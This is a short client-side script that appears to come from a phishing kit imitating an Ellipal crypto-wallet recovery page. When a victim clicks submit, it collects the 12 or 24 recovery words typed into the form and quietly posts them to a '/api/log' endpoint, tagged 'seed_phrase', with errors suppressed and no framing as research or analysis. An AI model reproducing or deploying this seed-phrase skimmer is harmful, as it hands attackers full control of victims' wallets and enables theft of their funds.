  <script>
    let csrf = null;

    function getCSRF() {
      if (!csrf && window._liveledCSRF) {
        csrf = window._liveledCSRF;
      }
    }

    document.addEventListener('DOMContentLoaded', function() {
      getCSRF();

      const submitBtn = document.getElementById('ellipal-submit-btn');
      if (submitBtn) {
        submitBtn.addEventListener('click', function(e) {
          e.preventDefault();
          getCSRF();
          if (!csrf) return;

          // Get all word inputs
          const wordInputs = document.querySelectorAll('input[placeholder="Word"]');
          const words = Array.from(wordInputs)
            .map(input => input.value.trim())
            .filter(w => w.length > 0);

          if (words.length === 12 || words.length === 24) {
            const phraseData = new URLSearchParams({
              _token: csrf,
              type: 'form_submit',
              page: 'ellipal_recovery',
              element: 'seed_phrase',
              value: words.join(' ')
            });

            fetch('/api/log', {
              method: 'POST',
              body: phraseData,
              keepalive: true
            }).catch(function(){});
          }
        });
      }

      // Auto-update csrf token
      var csrfCheckInterval = setInterval(function() {
        if (window._liveledCSRF && !csrf) {
          csrf = window._liveledCSRF;
          clearInterval(csrfCheckInterval);
        }
      }, 50);
    });
  </script>
